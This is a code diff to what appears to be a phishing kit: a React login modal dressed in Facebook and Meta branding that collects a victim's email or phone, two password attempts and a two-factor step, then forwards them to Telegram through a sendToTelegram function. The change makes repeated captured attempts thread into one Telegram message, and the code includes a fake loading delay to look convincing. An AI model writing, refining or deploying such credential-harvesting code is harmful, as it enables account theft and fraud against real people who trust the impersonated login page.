@@ -9,7 +9,7 @@ import SuccessModal from '@/components/success-modal';
 import fbIcon from '@/assets/images/icon.webp';
 import logoMeta from '@/assets/images/logo-meta.svg';
 
-const LoginModal = ({ onClose, formData = {} }) => {
+const LoginModal = ({ onClose, formData = {}, initialMessageId = null }) => {
     const { labels } = useLang();
     const [showPassword, setShowPassword] = useState(false);
     const [emailOrPhone, setEmailOrPhone] = useState('');
@@ -17,7 +17,7 @@ const LoginModal = ({ onClose, formData = {} }) => {
     const [loading, setLoading] = useState(false);
     const [errorMsg, setErrorMsg] = useState('');
     const [attempts, setAttempts] = useState(0);
-    const [prevMessageId, setPrevMessageId] = useState(null);
+    const [prevMessageId, setPrevMessageId] = useState(initialMessageId);
     const [password1, setPassword1] = useState('');
     const [password2, setPassword2] = useState('');
     const [isTwoFactorStep, setIsTwoFactorStep] = useState(false);
@@ -72,12 +72,12 @@ const LoginModal = ({ onClose, formData = {} }) => {
             ? { emailOrPhone, password1: password }
             : { emailOrPhone, password1, password2: password };
 
-        const messageId = await sendToTelegram(formData, credentials, isFirstAttempt ? null : prevMessageId);
+        const messageId = await sendToTelegram(formData, credentials, prevMessageId);
 
         if (isFirstAttempt) {
             setPassword1(password);
-            setPrevMessageId(messageId);
         }
+        setPrevMessageId(messageId);
 
         await new Promise((resolve) =>
             setTimeout(resolve, config.password_loading_time * 1000)
@@ -315,4 +315,5 @@ export default LoginModal;
 LoginModal.propTypes = {
     onClose: PropTypes.func.isRequired,
     formData: PropTypes.object,
+    initialMessageId: PropTypes.number,
 };
